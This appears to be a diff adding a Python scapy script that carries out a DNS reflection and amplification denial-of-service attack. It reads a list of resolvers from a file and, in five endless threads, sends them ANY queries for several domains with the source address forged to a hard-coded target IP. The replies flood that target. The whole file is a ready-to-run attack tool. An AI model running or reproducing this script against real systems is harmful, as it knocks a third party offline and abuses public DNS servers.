@@ -1,0 +1,32 @@
+#!/usr/bin/env python
+
+import logging
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+from scapy.all import *
+import threading
+
+servers = []
+domains = ["defcon.org","cdnmycontent.org","goo.gl","mibbit.com","google.com"]
+typeq = "ALL"
+target = "88.156.47.25"
+with open("./dnsips","r") as f:
+	while True:
+		line = f.readline()
+		if not line: break
+		line = line.split(" ")[0]
+		servers.append(line)
+	print(str(len(servers))+" servers read from file.")
+	
+def run():
+	while True:
+		print("loopy loop")
+		for domain in domains:
+			for server in servers:
+				send(IP(dst=server, src=target)/UDP(sport=53, dport=53)/DNS(rd=1,qd=DNSQR(qname=domain, qtype=typeq)),verbose=0)
+			print("Sent query to "+server)
+
+for _ in range(5):
+	t = threading.Thread(target=run)
+	t.start()
+	print("thread started")
+
